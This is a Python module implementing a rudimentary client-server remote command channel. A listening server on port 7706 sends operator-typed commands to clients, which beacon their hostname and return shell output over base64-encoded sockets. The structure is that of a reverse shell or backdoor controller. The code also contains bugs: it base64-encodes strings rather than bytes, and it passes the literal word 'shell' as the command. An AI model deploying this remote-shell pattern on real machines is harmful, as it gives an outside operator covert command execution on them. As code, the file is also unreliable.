import socket
import threading
import subprocess
import os
import base64
import time
from .Shell import Shell

class Helper:
    def __init__(self, conn):
        self.header = 10240
        self.formate = 'utf-8'
        self.conn = conn

    def encode(self, message):
        return base64.b64encode(message)


    def decode(self, message):
        return base64.b64decode(message).decode(self.formate, errors='ignore')

    def message(self, message):
        message = self.encode(message)
        return message

    def send(self, message):
        message = self.message(message)
        self.conn.send(message)

    def msg_length(self):
        message_length = self.receive().strip()
        if message_length:
            try:
                return int(message_length)
            except (ValueError, TypeError):
                return None
        return None

    def receive(self, length=64):
        return self.decode(self.conn.recv(length))
   



class Server():
    def __init__(self, host="0.0.0.0", port=7706):
        self.host = host
        self.port = port
        self.hostname = socket.gethostname()
        self.header = 10240
        self.formate = 'utf-8'

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))


    def start(self):
        self.server.listen()
        print(f"[LISTENING] Server is listening on {self.host}:{self.port}")

        while True:
            conn, addr = self.server.accept()
            thread = threading.Thread(target=self.handle, args=(conn, addr))
            thread.start()
            print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")

    def handle(self, conn, addr):
        print(f"[NEW CONNECTION] {addr} connected to the server")

        connected = True
        while connected:
            helper = Helper(conn)

            o = helper.receive(self.header)
            if o == "exit":
                connected = False
                break
            elif o == "shell":
                print(f"[Client] {addr}: {o}")
                cmd = input(f"[Server][{addr}][shell]?>: ").strip()
                helper.send(cmd)
            else:
                print(f"[Client] {addr}: {o}")
                cmd = input(f"[Server][{addr}]?>: ").strip()
                helper.send(cmd)
        conn.close()





class Client():
    def __init__(self, host="0.0.0.0", port=7706):
        self.host = host
        self.port = port
        self.hostname = socket.gethostname()
        self.header = 10240
        self.formate = 'utf-8'

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.client.connect((self.host, self.port))
            helper = Helper(self.client)
            helper.send(f"ALIVE:{socket.gethostname()}")

            print("[CONNECTED] Client connected to server")
        except Exception as e:
            print(f"[ERROR] Connection failed: {e}")
            self.client = None
    

    def start(self):
        while True:
            try:
                # Receive response from server
                helper = Helper(self.client)
                cmd = helper.receive(self.header)
                if not cmd or cmd == "exit":
                    helper.send("exit")
                    break
                elif cmd == "shell":
                    shell = Shell(cmd)
                    ouput = shell.run()
                    helper.send(ouput)
                    
                print(f"[server] {self.hostname}: {cmd}")
                
                # Send response back
                helper.send("Command executed")
                
            except Exception as e:
                print(f"Error: {e}")
                break
        self.client.close()





